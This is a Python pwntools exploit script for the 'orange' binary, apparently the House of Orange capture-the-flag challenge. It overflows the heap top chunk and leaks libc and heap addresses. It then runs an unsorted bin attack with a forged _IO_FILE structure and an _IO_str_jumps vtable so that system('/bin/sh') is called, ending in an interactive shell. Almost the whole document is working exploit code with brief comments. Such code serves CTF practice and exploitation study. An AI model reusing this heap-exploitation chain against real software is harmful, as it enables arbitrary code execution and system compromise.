from pwn import *
#context(os='linux', arch='amd64', log_level='debug')

io = process('./orange')
elf = ELF('./orange')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')

IO_file_jumps_offset = libc.sym['_IO_file_jumps']
IO_str_underflow_offset = libc.sym['_IO_str_underflow']
for ref_offset in libc.search(p64(IO_str_underflow_offset)):
    possible_IO_str_jumps_offset = ref_offset - 0x20
    if possible_IO_str_jumps_offset > IO_file_jumps_offset:
        print possible_IO_str_jumps_offset
        break

def build(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(1))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name :')
    io.send(Name)
    io.recvuntil('Orange:')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange:')
    io.sendline(str(Choice))

def see():
    io.recvuntil('Your choice : ')
    io.sendline(str(2))

def upgrade(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(3))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name:')
    io.send(Name)
    io.recvuntil('Orange: ')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange: ')
    io.sendline(str(Choice))



#OverWrite TopChunk
build(0x80,'AAAA',1,1)
upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0)+p32(0)+2*p64(0)+p64(0xf31),2,2)

#TopChunk->unsorted bin
build(0x1000,'CCCC',3,3)

#leak libc_base 
build(0x400,'D'*8,4,4)
see()
io.recvuntil('Name of house : DDDDDDDD')
libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c2760-0x668
print "libc_base : " +hex(libc_base)
system_addr = libc_base+libc.symbols['system']
log.info('system_addr:'+hex(system_addr))
IO_list_all = libc_base+libc.symbols['_IO_list_all']
log.info('_IO_list_all:'+hex(IO_list_all))
_IO_str_jumps=libc_base+possible_IO_str_jumps_offset
print "possible_IO_str_jumps_offset : "+hex(_IO_str_jumps)




#leak heap_base
upgrade(0x400,'E'*0x10,5,5)
see()
io.recvuntil('Name of house : ')
io.recvuntil('E'*0x10)
heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
log.info('heap_base:'+hex(heap_base))


# unsortedbin attack ,Fsop

binsh_addr = heap_base +0x140

pad ="/bin/sh\x00"   # binsh 地址
pad = pad.ljust(0x410,"\x00")
pad += p32(6)+p32(6)+p64(0)

stream = p64(0)+p64(0x61)  # fp->_flags为0   
stream += p64(0xddaa)+p64(IO_list_all-0x10)
stream +=p64(1)+p64(0x7ffffffffffd) # (fp->_IO_write_ptr - fp->_IO_write_base )是一个很大的正值,远大于(fp->_IO_buf_end - fp->_IO_buf_base)
stream +=p64(0)
stream +=p64(0)+p64((binsh_addr-100)/2)  # fp->_IO_buf_base=0 ,  fp->_IO_buf_end=(binsh_addr-100)/2
stream = stream.ljust(0xc0,"\x00")
stream += p64(0) # mode<=0
stream += p64(0)
stream += p64(0)
stream += p64(_IO_str_jumps)   # vtable
stream = stream.ljust(0xe0,"\x00")
stream +=p64(system_addr)   # call system

payload = pad + stream

upgrade(0x800,payload,6,3)
#raw_input()
#gdb.attach(io)
io.recvuntil('Your choice : ')
io.sendline(str(1))

io.interactive()
